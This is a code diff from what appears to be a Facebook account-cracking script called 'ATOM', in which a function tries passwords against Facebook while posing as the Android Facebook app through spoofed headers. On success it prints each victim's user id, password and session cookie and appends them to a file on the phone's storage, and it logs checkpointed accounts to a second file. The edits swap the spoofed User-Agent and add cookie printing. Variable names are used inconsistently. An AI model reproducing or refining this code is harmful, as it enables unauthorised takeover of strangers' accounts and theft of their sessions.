@@ -1289,7 +1289,7 @@ def m5(idf,pwv):
             'X-FB-Connection-Type':'unknown',
             'X-FB-connection-quality':'EXCELLENT',
             "X-Tigon-Is-Retry": "False",
-            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; RMX2027 Build/RP1A.200720.011) [FBAN/FB4A;FBAV/258.0.0.34.119;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/199294666;FBCR/IND airtel;FBMF/realme;FBBD/realme;FBDV/RMX2027;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1448};FB_FW/1;FBRV/0;]',
+            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; RMX3611 Build/SM-A710S) [FBAN/EMA;FBBV/470353487;FBAV/353.0.0.5.112;FBDV/RMX3611;FBLC/id_ID;FBNG/WIFI;FBMNT/METERED;FBDM/{density=3.0}]',
             "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
             'Accept-Encoding':'gzip, deflate',
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -1304,13 +1304,14 @@ def m5(idf,pwv):
                     ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                     res = requests.get(ckk).text
                     if 'Photoshop' in res:
-                            print('\r\r\033[1;32m[atom-OK] '+uid+' | '+ps)
-                            open('/sdcard/ATOM/atom-live-ok.txt','a').write(uid+'|'+ps+'|'+cookie+'\n')
-                            ok.append(ids)
+                            print('\r\r\033[1;32m[atom-OK] '+uid+' | '+pw)
+                            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {cookie}\33[1;36m")
+                            open('/sdcard/ATOM/atom-live-ok.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+                            ok+=1
                             break 
                     elif 'www.facebook.com' in q['error']['message']:
-                            print('\r\r\033[1;30m[ATOM-CP] '+sid+' | '+ps)
-                            open('/sdcard/ATOM/ATOM-CP.txt','a').write(ids+'|'+ps+'\n')
+                            print('\r\r\033[1;30m[ATOM-CP] '+idf+' | '+pw)
+                            open('/sdcard/ATOM/ATOM-CP.txt','a').write(idf+'|'+pw+'\n')
                             cp.append(ids)
                             break
                     else:
